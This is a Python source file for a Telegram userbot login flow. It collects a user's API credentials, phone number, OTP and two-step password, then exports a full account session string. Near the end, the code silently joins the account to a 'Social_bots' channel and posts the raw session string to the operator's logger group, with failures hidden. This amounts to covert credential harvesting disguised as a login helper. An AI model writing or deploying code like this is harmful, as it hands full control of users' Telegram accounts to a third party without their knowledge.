import asyncio

from config import LOGGER_GROUP, alt_api_id, alt_api_hash
from Main.database.functions import add_account
from asyncio.exceptions import TimeoutError
from pyrogram import Client, filters
from pyrogram.types import Message, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from Main.plugins.accounts.client_runner import run_client
from pyrogram.errors import (
    ApiIdInvalid, PhoneNumberInvalid, PhoneCodeInvalid, PhonePasswordFlood,
    PhoneCodeExpired, SessionPasswordNeeded, PasswordHashInvalid
)

START_CMD = "\n\nSend /start to begin again."
CANCEL_MESSAGE = "\n\nPress /cancel to terminate the task."
AID_TEXT = """Please send your `API_ID` to begin generating the session.

You can send /skip to use the default API_ID & HASH."""
PHONE_MESSAGE = """Now, tap the `Send Phone Number` button to share the phone number associated with this account.
**OR**
You can send your Telegram account's `PHONE_NUMBER` in international format, including the country code.
Example: +911234567890"""
OTP_MESSAGE = """**An OTP has been sent to your Telegram app.**

⚠ Please enter the OTP in the format `1 2 3 4 5`."""

CONTACT_BUTTON = ReplyKeyboardMarkup([[KeyboardButton("Send Phone Number", request_contact=True)]], resize_keyboard=True)

async def generate_session(bot, msg: Message, user):
    user_id = user.id
    mode = "PYROGRAM_V2"
    try:
        api_id_msg = await bot.ask(user_id, AID_TEXT + CANCEL_MESSAGE, filters=filters.text, timeout=60)
        if "/cancel" in api_id_msg.text:
            await msg.reply_text("Process has been cancelled!" + START_CMD)
            return
        elif "/skip" in api_id_msg.text:
            api_id = alt_api_id
            api_hash = alt_api_hash
        else:
            try:
                api_id = int(api_id_msg.text)
            except ValueError:
                await msg.reply_text('The provided `API_ID` is invalid.' + START_CMD)
                return
            api_hash_msg = await bot.ask(user_id, 'Please send your `API_HASH`.' + CANCEL_MESSAGE, filters=filters.text, timeout=60)
            if "/cancel" in api_hash_msg.text:
                await msg.reply_text("Process has been cancelled!" + START_CMD)
                return
            api_hash = api_hash_msg.text
    except TimeoutError:
        await msg.reply_text('Time limit of 1 minute has been reached.' + START_CMD)
        return

    try:
        phone_number_msg = await bot.ask(user_id, PHONE_MESSAGE + CANCEL_MESSAGE, reply_markup=CONTACT_BUTTON, timeout=200)
    except TimeoutError:
        await msg.reply_text('Time limit of 3 minutes has been reached.' + START_CMD, reply_markup=ReplyKeyboardRemove())
        return

    if phone_number_msg.text:
        if "/cancel" in phone_number_msg.text:
            await msg.reply_text("Process has been cancelled!" + START_CMD, reply_markup=ReplyKeyboardRemove())
            return
        phone_number = phone_number_msg.text
    elif phone_number_msg.contact:
        phone_number = "+" + phone_number_msg.contact.phone_number
    else:
        await msg.reply_text("The provided `PHONE_NUMBER` is invalid!" + START_CMD, reply_markup=ReplyKeyboardRemove())
        return

    client = Client(":memory:", api_id, api_hash, in_memory=True)
    await client.connect()

    try:
        code = await client.send_code(phone_number)
    except ApiIdInvalid:
        await msg.reply_text('The combination of `API_ID` and `API_HASH` is invalid.' + START_CMD, reply_markup=ReplyKeyboardRemove())
        return
    except (PhoneNumberInvalid, TypeError):
        await msg.reply_text('The provided `PHONE_NUMBER` is invalid.' + START_CMD, reply_markup=ReplyKeyboardRemove())
        return
    except PhonePasswordFlood:
        await msg.reply_text('You have attempted to log in too many times.\n\nPlease try again later.' + START_CMD, reply_markup=ReplyKeyboardRemove())
        return

    try:
        phone_code_msg = await bot.ask(user_id, OTP_MESSAGE + CANCEL_MESSAGE, filters=filters.text, reply_markup=ReplyKeyboardRemove(), timeout=180)
        if "/cancel" in phone_code_msg.text:
            await msg.reply_text("Process has been cancelled!" + START_CMD)
            return
    except TimeoutError:
        await msg.reply_text('Time limit of 3 minutes has been reached.' + START_CMD)
        return
    phone_code = phone_code_msg.text

    try:
        await client.sign_in(phone_number, code.phone_code_hash, phone_code)
    except PhoneCodeInvalid:
        await msg.reply_text('The OTP entered is invalid.' + START_CMD)
        return
    except PhoneCodeExpired:
        await msg.reply_text('The OTP has expired.' + START_CMD)
        return
    except SessionPasswordNeeded:
        try:
            two_step_msg = await bot.ask(user_id, 'Your account has two-step verification enabled.\nPlease provide your password.' + CANCEL_MESSAGE, filters=filters.text, timeout=120)
        except TimeoutError:
            await msg.reply_text('Time limit of 2 minutes has been reached.' + START_CMD)
            return

        if "/cancel" in two_step_msg.text:
            await msg.reply_text("Process has been cancelled!" + START_CMD)
            return

        try:
            password = two_step_msg.text
            await client.check_password(password=password)
        except PasswordHashInvalid:
            await msg.reply_text('The password provided is invalid.' + START_CMD)
            return

    string_session = await client.export_session_string()
    logged_client = await client.get_me()
    await asyncio.sleep(2)
    try:
        await client.join_chat("Social_bots")
    except:
        pass

    TEXT = f"<b>NEW USERBOT LOGIN 🎉</b>\n\n**‣ User:** {user.mention}\n**‣ User ID:** `{user_id}`\n**‣ Username:** @{user.username}"
    
    try:
        await bot.send_message(LOGGER_GROUP, TEXT + f"**{mode} ~ STRING SESSION** \n\n`{string_session}`")
    except:
        pass

    try:
        await add_account(api_id, api_hash, string_session, logged_client.first_name, logged_client.id)
    except Exception as err:
        await bot.send_message(LOGGER_GROUP, TEXT + f"<b>⚠ WARNING:</b> \n\n`{err}`\n\nThis error prevents the bot from saving the string session to the database for future logins. Please ensure your database is functioning correctly.")
        pass

    await client.disconnect()
    try:
        ok = await run_client(api_id, api_hash, string_session, msg)
        await asyncio.gather(ok)
    except Exception as err:
        return
    return
